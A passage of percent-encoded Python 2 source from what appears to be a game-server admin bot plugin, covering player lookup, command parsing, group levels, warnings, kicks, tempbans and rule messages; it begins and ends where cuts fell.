0%20%20%20%20%20%20%20for%20c%20in%20matches%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20c.name%20%3D%3D%20c.cid%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20names.append('%5E7%25s'%20%25%20c.name)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20names.append('%5E7%25s%20%5B%5E2%25s%5E7%5D'%20%25%20(c.name%2C%20c.cid))%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20client%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('players_matched'%2C%20handle%2C%20'%2C%20'.join(names)))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20None%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20matches%5B0%5D%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20client%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('no_players'%2C%20handle))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20None%0A%0A%20%20%20%20def%20parseUserCmd(self%2C%20cmd%2C%20req%3DFalse)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Return%20a%20tuple%20of%20two%20elements%20extracted%20from%20cmd%20%3A%0A%20%20%20%20%20%20%20%20%20-%20a%20player%20identifier%0A%20%20%20%20%20%20%20%20%20-%20optional%20parameters%0A%20%20%20%20%20%20%20%20req%3A%20set%20to%20True%20if%20parameters%20is%20required.%0A%20%20%20%20%20%20%20%20Return%20None%20if%20could%20cmd%20is%20not%20in%20the%20expected%20format%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20re.match(self._parseUserCmdRE%2C%20cmd)%0A%0A%20%20%20%20%20%20%20%20if%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cid%20%3D%20m.group('cid')%0A%20%20%20%20%20%20%20%20%20%20%20%20parms%20%3D%20m.group('parms')%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20req%20and%20not%20(parms%20and%20len(parms))%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20None%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20cid%5B%3A1%5D%20%3D%3D%20%22'%22%20and%20cid%5B-1%3A%5D%20%3D%3D%20%22'%22%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cid%20%3D%20cid%5B1%3A-1%5D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20cid%2C%20parms%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20None%0A%0A%20%20%20%20def%20getGroupLevel(self%2C%20level)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Return%20a%20group%20level%20from%20group%20keyword%20or%20group%20level%20understand%20level%20ranges%20(ie%3A%2020-40%20or%20mod-admin).%0A%20%20%20%20%20%20%20%20%3Aparam%20level%3A%20The%20group%20keyword%2Flevel%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20level%20%3D%20str(level)%0A%20%20%20%20%20%20%20%20if%20level.lower()%20%3D%3D%20'none'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20'none'%0A%20%20%20%20%20%20%20%20elif%20level.count('-')%20%3D%3D%201%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20(levelmin%2C%20levelmax)%20%3D%20level.split('-'%2C%201)%0A%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20levelmin%20%3D%20int(levelmin)%0A%20%20%20%20%20%20%20%20%20%20%20%20except%20ValueError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20levelmin%20%3D%20self.console.getGroupLevel(levelmin)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%20KeyError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.error('unknown%20group%20%25s'%20%25%20levelmin)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20False%0A%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20levelmax%20%3D%20int(levelmax)%0A%20%20%20%20%20%20%20%20%20%20%20%20except%20ValueError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20levelmax%20%3D%20self.console.getGroupLevel(levelmax)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%20KeyError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.error('unknown%20group%20%25s'%20%25%20levelmax)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20False%0A%20%20%20%20%20%20%20%20%20%20%20%20level%20%3D%20'%25s-%25s'%20%25%20(levelmin%2C%20levelmax)%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20level%20%3D%20int(level)%0A%20%20%20%20%20%20%20%20%20%20%20%20except%20ValueError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20level%20%3D%20self.console.getGroupLevel(level)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%20KeyError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.error('unknown%20group%20%25s'%20%25%20level)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20False%0A%20%20%20%20%20%20%20%20return%20level%0A%0A%20%20%20%20def%20getReason(self%2C%20kword)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Return%20a%20reason%20according%20to%20the%20given%20keyword.%0A%20%20%20%20%20%20%20%20%3Aparam%20kword%3A%20The%20keyword%20to%20use%20to%20lookup%20the%20reason%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20not%20kword%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20''%0A%0A%20%20%20%20%20%20%20%20r%20%3D%20self.getWarning(kword)%0A%20%20%20%20%20%20%20%20if%20r%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20r%5B1%5D%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20kword%0A%0A%20%20%20%20def%20getSpam(self%2C%20kword)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Return%20a%20spam%20message%20according%20to%20the%20given%20keyword.%0A%20%20%20%20%20%20%20%20%3Aparam%20kword%3A%20The%20keyword%20to%20use%20to%20lookup%20the%20spam%20message%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20not%20kword%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20''%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20s%20%3D%20self.config.getTextTemplate('spamages'%2C%20kword)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20s%5B%3A1%5D%20%3D%3D%20'%2F'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20s%20%3D%20self.config.getTextTemplate('spamages'%2C%20s%5B1%3A%5D)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20s%5B%3A1%5D%20%3D%3D%20'%2F'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.error('getSpam%3A%20possible%20spam%20recursion%20%25s%3A%20%25s'%2C%20kword%2C%20s)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20None%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20s%0A%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20None%0A%20%20%20%20%20%20%20%20except%20Exception%2C%20msg%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error('getSpam%3A%20could%20not%20get%20spam%20%22%25s%22%3A%20%25s%5Cn%25s'%2C%20kword%2C%20msg%2C%20traceback.extract_tb(sys.exc_info()%5B2%5D))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20None%0A%0A%20%20%20%20def%20getWarning(self%2C%20kword)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Return%20a%20warning%20message%20according%20to%20the%20given%20keyword%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20not%20kword%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20kword%20%3D%20'default'%0A%20%20%20%20%20%20%20%20return%20self.warn_reasons.get(kword)%0A%0A%20%20%20%20def%20clearAll(self%2C%20sclient%2C%20client%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Clear%20a%20client%20of%20all%20warnings.%0A%20%20%20%20%20%20%20%20%3Aparam%20sclient%3A%20The%20client%20whose%20warnings%20needs%20to%20be%20cleared%0A%20%20%20%20%20%20%20%20%3Aparam%20client%3A%20The%20client%20removing%20the%20warnings%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20for%20w%20in%20sclient.warnings%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20admin%20%3D%20None%0A%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20admin%20%3D%20self.console.storage.getClient(Client(id%3Dw.adminId))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20client%20object%20needs%20console%20to%20get%20groups%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20admin.console%20%3D%20self.console%0A%20%20%20%20%20%20%20%20%20%20%20%20except%20Exception%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20warning%20given%20by%20the%20bot%20(censor%2C%20tk%2C%20etc)%20have%20adminId%20%3D%200%20which%20match%20no%20client%20in%20storage%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pass%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20admin%20is%20None%20or%20admin.maxLevel%20%3C%3D%20client.maxLevel%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20w.inactive%20%3D%201%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.storage.setClientPenalty(w)%0A%0A%20%20%20%20%20%20%20%20self._tkPlugin%20%3D%20self.console.getPlugin('tk')%0A%20%20%20%20%20%20%20%20if%20self._tkPlugin%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self._tkPlugin.forgiveAll(sclient.cid)%0A%0A%20%20%20%20%20%20%20%20sclient.save()%0A%0A%20%20%20%20def%20doList(self%2C%20client%2C%20cmd)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20List%20online%20players.%0A%20%20%20%20%20%20%20%20%3Aparam%20client%3A%20The%20client%20who%20launched%20the%20!list%20command%0A%20%20%20%20%20%20%20%20%3Aparam%20cmd%3A%20The%20command%20object%20instance%20for%20sayLoudOrPM%20method%20invoke%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20names%20%3D%20%5Bself.getMessage('player_id'%2C%20c.name%2C%20c.cid)%20for%20c%20in%20self.console.clients.getClientsByLevel()%5D%0A%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%2C%20'.join(names))%0A%0A%20%20%20%20def%20doPastBansCheck(self)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Scheduled%20execution%3A%20will%20check%20for%20banned%20players%20still%0A%20%20%20%20%20%20%20%20connected%20to%20the%20server%20and%20kick%20them%20if%20needed.%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20counts%20%3D%20self.console.storage.getCounts()%0A%20%20%20%20%20%20%20%20for%20k1%20in%20self._past_bans_counts%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20self._past_bans_counts%5Bk1%5D%20!%3D%20counts%5Bk1%5D%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20update%20counts%20for%20next%20check%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20k2%20in%20self._past_bans_counts%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self._past_bans_counts%5Bk2%5D%20%3D%20counts%5Bk2%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('checking%20for%20banned%20clients%20still%20connected%20to%20the%20server...')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20client%20in%20self.console.clients.getList()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20client.numBans%20%3E%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20ban%20%3D%20client.lastBan%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20ban%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug('banned%20client%20still%20online%20%25s%3A%20re-applying%20penalty%20(%25s)'%20%25%20(client%2C%20ban.type))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.reBan(ban)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20break%0A%0A%20%20%20%20def%20doLonglist(self%2C%20client%2C%20cmd)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20List%20online%20players%20one%20line%20at%20a%20time.%0A%20%20%20%20%20%20%20%20%3Aparam%20client%3A%20The%20client%20who%20launched%20the%20!list%20command%0A%20%20%20%20%20%20%20%20%3Aparam%20cmd%3A%20The%20command%20object%20instance%20for%20sayLoudOrPM%20method%20invoke%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20for%20c%20in%20self.console.clients.getClientsByLevel()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20clientinfo%20%3D%20self.getMessage('player_id_reverse'%2C%20c.cid%2C%20c.name)%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20clientinfo)%0A%0A%20%20%20%20def%20sayMany(self%2C%20msg%2C%20times%3D5%2C%20delay%3D1)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Print%20a%20message%20to%20all%20the%20players.%0A%20%20%20%20%20%20%20%20%3Aparam%20msg%3A%20The%20message%20to%20be%20printed%0A%20%20%20%20%20%20%20%20%3Aparam%20times%3A%20How%20many%20times%20the%20message%20should%20be%20printed%0A%20%20%20%20%20%20%20%20%3Aparam%20delay%3A%20Amount%20of%20time%20between%20prints%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20for%20c%20in%20range(1%2C%20times%20%2B%201)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E%25i%25s'%20%25%20(c%2C%20msg))%0A%20%20%20%20%20%20%20%20%20%20%20%20time.sleep(delay)%0A%0A%20%20%20%20def%20penalizeClient(self%2C%20penalty_type%2C%20client%2C%20reason%2C%20keyword%3DNone%2C%20duration%3D0%2C%20admin%3DNone%2C%20data%3D'')%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Inflict%20a%20penalty%20to%20the%20given%20client.%0A%20%20%20%20%20%20%20%20%3Aparam%20penalty_type%3A%20The%20penalty%20type%0A%20%20%20%20%20%20%20%20%3Aparam%20client%3A%20The%20client%20to%20punish%0A%20%20%20%20%20%20%20%20%3Aparam%20reason%3A%20The%20reason%20for%20this%20punishment%0A%20%20%20%20%20%20%20%20%3Aparam%20keyword%3A%20The%20keyword%20used%20for%20this%20punishment%0A%20%20%20%20%20%20%20%20%3Aparam%20duration%3A%20The%20punishment%20duration%0A%20%20%20%20%20%20%20%20%3Aparam%20admin%3A%20The%20client%20who%20issued%20the%20punishment%0A%20%20%20%20%20%20%20%20%3Aparam%20data%3A%20Extra%20data%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20reason%20is%20None%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20reason%20%3D%20self.getReason(keyword)%0A%0A%20%20%20%20%20%20%20%20duration%20%3D%20functions.time2minutes(duration)%0A%0A%20%20%20%20%20%20%20%20if%20penalty_type%20%3D%3D%20self.PENALTY_KICK%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.kick(reason%2C%20keyword%2C%20admin%2C%20False%2C%20data)%0A%20%20%20%20%20%20%20%20elif%20penalty_type%20%3D%3D%20self.PENALTY_TEMPBAN%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.tempban(reason%2C%20keyword%2C%20duration%2C%20admin%2C%20False%2C%20data)%0A%20%20%20%20%20%20%20%20elif%20penalty_type%20%3D%3D%20self.PENALTY_BAN%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.ban(reason%2C%20keyword%2C%20admin%2C%20False%2C%20data)%0A%20%20%20%20%20%20%20%20elif%20penalty_type%20%3D%3D%20self.PENALTY_WARNING%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warnClient(client%2C%20keyword%2C%20admin%2C%20True%2C%20data%2C%20duration)%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20self.console.inflictCustomPenalty(penalty_type%2C%20client%3Dclient%2C%20reason%3Dreason%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20duration%3Dduration%2C%20admin%3Dadmin%2C%20data%3Ddata)%20is%20not%20True%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.error('penalizeClient()%3A%20penalty%20type%20%25s%20not%20found'%2C%20penalty_type)%0A%0A%20%20%20%20def%20warnClient(self%2C%20sclient%2C%20keyword%2C%20admin%3DNone%2C%20timer%3DTrue%2C%20data%3D''%2C%20newDuration%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Warn%20a%20client.%0A%20%20%20%20%20%20%20%20%3Aparam%20sclient%3A%20The%20client%20to%20warn%0A%20%20%20%20%20%20%20%20%3Aparam%20keyword%3A%20The%20keyword%20used%20for%20this%20warning%0A%20%20%20%20%20%20%20%20%3Aparam%20admin%3A%20The%20admin%20who%20issued%20the%20warn%0A%20%20%20%20%20%20%20%20%3Aparam%20timer%3A%20Whether%20or%20not%20to%20track%20the%20warn%20time%0A%20%20%20%20%20%20%20%20%3Aparam%20data%3A%20Extra%20data%0A%20%20%20%20%20%20%20%20%3Aparam%20newDuration%3A%20A%20custom%20duration%20for%20this%20warning%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20duration%2C%20warning%20%3D%20self.getWarning(keyword)%0A%20%20%20%20%20%20%20%20except%20Exception%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20duration%2C%20warning%20%3D%20self.getWarning('generic')%0A%20%20%20%20%20%20%20%20%20%20%20%20warning%20%3D%20'%25s%20%25s'%20%25%20(warning%2C%20keyword)%0A%0A%20%20%20%20%20%20%20%20if%20newDuration%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20duration%20%3D%20newDuration%0A%0A%20%20%20%20%20%20%20%20warnrecord%20%3D%20sclient.warn(duration%2C%20warning%2C%20keyword%2C%20admin%2C%20data)%0A%20%20%20%20%20%20%20%20warning%20%3D%20sclient.exactName%20%2B%20'%5E7%2C%20'%20%2B%20warning%0A%0A%20%20%20%20%20%20%20%20if%20timer%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient.setvar(self%2C%20'warnTime'%2C%20self.console.time())%0A%0A%20%20%20%20%20%20%20%20warnings%20%3D%20sclient.numWarnings%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20pmglobal%20%3D%20self.config.getboolean('warn'%2C%20'pm_global')%0A%20%20%20%20%20%20%20%20except%20(NoOptionError%2C%20ValueError)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20pmglobal%20%3D%20False%0A%0A%20%20%20%20%20%20%20%20if%20pmglobal%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20msg%20%3D%20self.config.getTextTemplate('warn'%2C%20'message'%2C%20warnings%3Dwarnings%2C%20reason%3Dwarning)%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient.message(msg)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.write('screentell%20%25s%20%25s'%20%25%20(sclient.cid%2C%20msg))%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20admin%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20admin.message(msg)%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.config.getTextTemplate('warn'%2C%20'message'%2C%20warnings%3Dwarnings%2C%20reason%3Dwarning))%0A%20%20%20%20%20%20%20%20%20%20%20%20msg%20%3D%20self.config.getTextTemplate('warn'%2C%20'message'%2C%20warnings%3Dwarnings%2C%20reason%3Dwarning)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.write('screentell%20%25s%20%25s'%20%25%20(sclient.cid%2C%20msg))%0A%20%20%20%20%20%20%20%20if%20warnings%20%3E%3D%20self.warn_instant_kick_num%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warnKick(sclient%2C%20admin)%0A%20%20%20%20%20%20%20%20elif%20warnings%20%3E%3D%20self.warn_alert_kick_num%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20duration%20%3D%20functions.minutesStr(self.warnKickDuration(sclient))%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20warn%20%3D%20sclient.lastWarning%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20warn%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.config.getTextTemplate('warn'%2C%20'alert'%2C%20name%3Dsclient.exactName%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20warnings%3Dwarnings%2C%20duration%3Dduration%2C%20reason%3Dwarn.reason))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.config.getTextTemplate('warn'%2C%20'alert'%2C%20name%3Dsclient.exactName%2C%20warnings%3Dwarnings%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20duration%3Dduration%2C%20reason%3D'Too%20many%20warnings'))%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient.setvar(self%2C%20'checkWarn'%2C%20True)%0A%20%20%20%20%20%20%20%20%20%20%20%20t%20%3D%20threading.Timer(25%2C%20self.checkWarnKick%2C%20(sclient%2C%20admin%2C%20data))%0A%20%20%20%20%20%20%20%20%20%20%20%20t.start()%0A%0A%20%20%20%20%20%20%20%20return%20warnrecord%0A%0A%20%20%20%20def%20checkWarnKick(self%2C%20sclient%2C%20client%3DNone%2C%20data%3D'')%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Check%20if%20a%20client%20needs%20to%20be%20kicked%20for%20too%20many%20warnings.%0A%20%20%20%20%20%20%20%20%3Aparam%20sclient%3A%20The%20client%20on%20who%20perform%20the%20check%0A%20%20%20%20%20%20%20%20%3Aparam%20client%3A%20The%20client%20who%20issued%20the%20last%20warning%0A%20%20%20%20%20%20%20%20%3Aparam%20data%3A%20Extra%20data%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20sclient.var(self%2C%20'checkWarn').value%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient.setvar(self%2C%20'checkWarn'%2C%20False)%0A%20%20%20%20%20%20%20%20%20%20%20%20kick_num%20%3D%20self.config.getint('warn'%2C%20'alert_kick_num')%0A%20%20%20%20%20%20%20%20%20%20%20%20warnings%20%3D%20sclient.numWarnings%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20warnings%20%3E%3D%20kick_num%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.warnKick(sclient%2C%20client%2C%20data)%0A%0A%20%20%20%20def%20warnKickDuration(self%2C%20sclient)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Retrieve%20the%20duration%20for%20a%20tempban%20penalty%20due%20too%20many%20warnings.%0A%20%20%20%20%20%20%20%20%3Aparam%20sclient%3A%20The%20client%20who%20has%20been%20warned%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20sclient.numWarnings%20%3E%20self.config.getint('warn'%2C%20'tempban_num')%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20duration%20%3D%20self.config.getDuration('warn'%2C%20'tempban_duration')%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20duration%20%3D%200%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20w%20in%20sclient.warnings%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20duration%20%2B%3D%20w.duration%20*%2060%0A%20%20%20%20%20%20%20%20%20%20%20%20duration%20%3D%20(duration%20%2F%20self.config.getint('warn'%2C%20'duration_divider'))%20%2F%2060%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20maxDuration%20%3D%20self.config.getDuration('warn'%2C%20'max_duration')%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20duration%20%3E%20maxDuration%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20duration%20%3D%20maxDuration%0A%0A%20%20%20%20%20%20%20%20return%20duration%0A%0A%20%20%20%20def%20warnKick(self%2C%20sclient%2C%20client%3DNone%2C%20data%3D'')%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Tempban%20a%20client%20for%20too%20many%20warnings.%0A%20%20%20%20%20%20%20%20%3Aparam%20sclient%3A%20The%20client%20to%20tempban%0A%20%20%20%20%20%20%20%20%3Aparam%20client%3A%20The%20client%20who%20issued%20the%20last%20warning%0A%20%20%20%20%20%20%20%20%3Aparam%20data%3A%20Extra%20data%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20msg%20%3D%20sclient.numWarnings%0A%20%20%20%20%20%20%20%20keyword%20%3D%20''%0A%20%20%20%20%20%20%20%20warn%20%3D%20sclient.lastWarning%0A%20%20%20%20%20%20%20%20if%20warn%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20msg%20%3D%20warn.reason%0A%20%20%20%20%20%20%20%20%20%20%20%20keyword%20%3D%20warn.keyword%0A%0A%20%20%20%20%20%20%20%20duration%20%3D%20self.warnKickDuration(sclient)%0A%20%20%20%20%20%20%20%20if%20duration%20%3E%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient.tempban(self.config.getTextTemplate('warn'%2C%20'reason'%2C%20reason%3Dmsg)%2C%20keyword%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20duration%2C%20client%2C%20False%2C%20data)%0A%0A%20%20%20%20def%20_sendRules(self%2C%20sclient%2C%20big%3DFalse)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Send%20rules%20to%20the%20given%20client%0A%20%20%20%20%20%20%20%20%3Aparam%20sclient%3A%20The%20client%20who%20to%20notice%20rules%20(may%20be%20None)%0A%20%20%20%20%20%20%20%20%3Aparam%20big%3A%20Whether%20or%20not%20to%20print%20a%20BIG%20message%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20rules%20%3D%20%5B%5D%0A%0A%20%20%20%20%20%20%20%20for%20i%20in%20range(1%2C%2020)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%2